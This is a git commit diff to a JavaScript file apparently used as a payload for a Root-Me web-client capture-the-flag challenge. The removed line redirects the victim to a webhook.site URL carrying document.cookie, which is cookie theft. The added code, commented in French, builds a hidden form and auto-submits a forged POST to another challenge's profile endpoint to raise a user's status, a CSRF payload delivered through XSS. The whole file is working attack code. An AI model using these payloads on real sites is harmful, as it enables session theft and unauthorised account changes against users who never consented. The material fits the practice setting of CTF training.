9bcc64030acd06a6b6038fad901cbfa0d1c36ae5
Another27350 <47773541+Another27350@users.noreply.github.com>
2026-02-04 16:37:45 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,1 +1,24 @@
-window.location = 'https://webhook.site/6a20dbc6-2e8f-4552-858f-600153062740?cookie=' + document.cookie;
+// On crée un formulaire virtuel qui cible le challenge CH22
+var form = document.createElement("form");
+form.method = "POST";
+// On vise la version HTTP (comme on est déjà sur le site en HTTP via la XSS, ça passera crème)
+form.action = "http://challenge01.root-me.org/web-client/ch22/?action=profile";
+form.enctype = "multipart/form-data"; // Important car le formulaire original l'utilise
+
+// Champ 1 : Ton pseudo
+var inputUser = document.createElement("input");
+inputUser.type = "hidden";
+inputUser.name = "username";
+inputUser.value = "hacker"; // Assure-toi que c'est bien ton pseudo ici !
+form.appendChild(inputUser);
+
+// Champ 2 : Le statut à activer
+var inputStatus = document.createElement("input");
+inputStatus.type = "hidden";
+inputStatus.name = "status";
+inputStatus.value = "on";
+form.appendChild(inputStatus);
+
+// On ajoute le formulaire à la page et on l'envoie
+document.body.appendChild(form);
+form.submit();
